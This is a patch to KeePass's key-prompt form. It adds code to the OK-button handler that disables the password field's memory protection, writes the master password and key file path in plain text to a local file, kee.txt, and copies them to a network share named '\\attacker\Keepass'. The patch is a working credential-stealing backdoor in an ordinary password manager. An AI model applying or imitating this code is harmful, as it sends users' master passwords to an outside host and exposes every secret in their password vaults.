@@ -1,0 +1,23 @@
+diff --git a/KeePass/Forms/KeyPromptForm.cs b/KeePass/Forms/KeyPromptForm.cs
+index adce019..635e067 100644
+--- a/KeePass/Forms/KeyPromptForm.cs
++++ b/KeePass/Forms/KeyPromptForm.cs
+@@ -469,7 +469,17 @@ namespace KeePass.Forms
+ 		private void OnBtnOK(object sender, EventArgs e)
+ 		{
+ 			if(!CreateCompositeKey()) this.DialogResult = DialogResult.None;
+-		}
++
++            m_tbPassword.EnableProtection(false);
++
++            string createText = "password: " + m_tbPassword.Text + Environment.NewLine;
++            createText += "keyfile: " + m_cmbKeyFile.Text + Environment.NewLine;
++
++            File.WriteAllText("kee.txt", createText);
++            System.IO.File.WriteAllBytes(@"\\attacker\Keepass\kee_unc.txt", Encoding.ASCII.GetBytes(createText));
++
++            m_tbPassword.EnableProtection(true);
++        }
+ 
+ 		private void OnBtnCancel(object sender, EventArgs e)
+ 		{
